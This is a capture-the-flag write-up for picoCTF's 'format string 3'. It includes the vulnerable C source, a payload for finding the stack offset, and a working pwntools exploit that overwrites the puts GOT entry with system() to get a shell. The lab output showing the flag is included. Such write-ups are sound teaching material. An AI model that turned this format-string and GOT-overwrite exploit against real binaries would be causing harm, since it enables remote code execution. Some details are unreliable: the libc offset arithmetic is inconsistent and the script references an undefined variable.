# format string 3

## Solving

```
This program doesn't contain a win function. How can you win?
Download the binary here.
Download the source here.
Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.
Connect with the challenge instance here:
nc rhea.picoctf.net 49363
```

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
        char *all_strings[MAX_STRINGS] = {NULL};
        char buf[1024] = {'\0'};

        setup();
        hello();

        fgets(buf, 1024, stdin);
        printf(buf);

        puts(normal_string);

        return 0;
}
```

Lookin at format-string-3.c source file we see no evidence of a flag file but references to /bin/sh, so we can assume our task is to spawn a shell.

The use of printf(buf), will be our format vulnerability.

Now essentially near the end after the ``printf`` vuln we see the puts statement for the function to spawn a shell. If we can change this ``puts`` to a syscall we can spawn a shell. 

Now like the last challenge let's first find the offset where the user input is placed on.

We can do this with our payload of ``(python3 -c 'print("1"*8 + ",%llx" * 50)')``

We can send this using python3

```shell
hadakoi@Laptop:~/ctfsolve$ (python3 -c 'print("1"*8 + ",%llx" * 50)') | ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fe3d04c93f0
  11111111,7fe3d0627963,fbad208b,7ffe85115400,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3131313131313131,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c,6c6c252c786c6c25,252c786c6c252c78,786c6c252c786c6c,6c252c786c6c252c,2c786c6c252c786c
/bin/sh
```
Now over here we can see our offset is 38

It also seems to have given the address of setvbuf in libc. 

Now back to the files they have given us they have provided us with a libc file. which is a core system library containing providing all the functions that programmes need for basic operations. When a program is compiled, many of its functions are not included in the binary itself. Instead, the program relies on external libraries like ``libc`

Now essentially over here we must find the address of ``system()`` we can only do this when we have the base pointer of libc and calculating a potential offset from the actual address. 

Hence because they have leaked to us the address of setvbuf in libc which is ``0x7fe3d04c93f0`` we can find the base pointer for this by doing ``(leaked setvbuf address) - (offset address of setvbuf)``

``libc base address=Actual address − Offset address``


Now we can load up the lib into gdb to find the offset address  ``setvbuf`` 

```shell
hadakoi@Laptop:~/ctfsolve$ gdb ./libc.so.6
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./libc.so.6...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
(No debugging symbols found in ./libc.so.6)
(gdb) info address setvbuf
Symbol "setvbuf" is at 0x7a3f0 in a file compiled without debugging.
(gdb)
```

Now that we know its ``0x783f0`` we can subtract this from ``0x7fe3d04c93f0`` This makes the libc base address ``0x7fe3d04c5f00``

However upon rerunning the script we realise that the leaked address changes on each runtime.

Now luckily pwntools has a cool feature where unlike last time I do not have to do all those weird calculations but can rather link the function from the linkc address 

```python                                                                  
from pwn import *

context.arch = 'amd64' # making sure everything is sent in correct instruction set

exe = "./format-string-3"
elf = ELF(exe)
libc = ELF("./libc.so.6")

p = remote("rhea.picoctf.net", 57804)

start = 38 # start of the offset on the programme stack

p.recvuntil(b'setvbuf in libc: ')
leakaddress = int(p.recvline().strip(), 16)
print("setvbuf @ %#x" % leak)

libc.address = leakaddress - 0x000000000007a3f0
print("libc @ %#x" % libc.address) # Calculating the true address

payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system}) #

p.sendline(payload)
p.interactive()
```

Now the main part here is the ``payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system})`` 

the ``fmtstr_payload()`` is uses to generate a payload we also have the starting spot of where the input is entered into which was our offset on the stack of 38

``elf.sym.got.puts`` refers to the GOT entry for puts()

---

**NOTE:** GOT is a table used by programmes that use shared libraries (like libc) to store the addresses of functions the program will call
for example in this case when a programm needs to call ``puts()`` instead of directly calling it the programme calls the ``GOT entry for puts which is a placeholder this points to the put()`` address present in libc.

As such we can exploit this changing this address that it knows for puts to the address for ``system()``.

---

libc.sym.system gives you the address of the system() function in the libc binary you've loaded. This is possbile as we calculated for the base address of the libc library

This address for system is what we use to overwrite the GOT entry for puts, so when the program tries to call puts, it will actually call system() instead. This is often used to spawn a shell (i.e., execute a command) when you pass it a command like /bin/sh.


Now running this script we end up managing to open up a shell allowing us to look around the directory to which i then see a file ``flag.txt`` from here I just cat the flag.txt retruning us the flag to which i can promptely exit the session.

```shell
hadakoi@Laptop:~/ctfsolve$ python3 script.py
[*] '/home/hadakoi/ctfsolve/format-string-3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] '/home/hadakoi/ctfsolve/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to rhea.picoctf.net on port 57804: Done
setvbuf @ 74c6d5a3a3f0
libc @ 74c6d59c0000
[*] Switching to interactive mode
                                                                                               c                   \x8b                                           \xd0                                                   \x00                                 \x00aaaaba\x18ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_f574d38f}$
```

## Flag

> picoCTF{G07_G07?_f574d38f}
